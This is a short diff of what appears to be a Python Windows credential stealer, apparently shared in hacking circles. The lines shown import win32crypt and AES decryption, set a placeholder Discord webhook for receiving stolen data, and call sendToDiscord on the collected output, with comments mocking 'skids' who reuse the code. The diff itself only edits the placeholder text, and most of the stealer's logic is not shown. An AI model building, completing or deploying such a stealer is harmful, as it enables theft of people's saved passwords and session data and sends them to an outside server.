@@ -12,7 +12,7 @@ from Crypto.Cipher import AES
 import win32crypt
 # remove the example webhook in between "webhook" with your own
 
-webhook = "put your token here fcking skid lol"
+webhook = "put your webhook here fcking skid lol"
 
 
 
@@ -353,3 +353,4 @@ else:
     sendToDiscord(finaloutput)
 
 #thanks for stealing my code for free lol
+
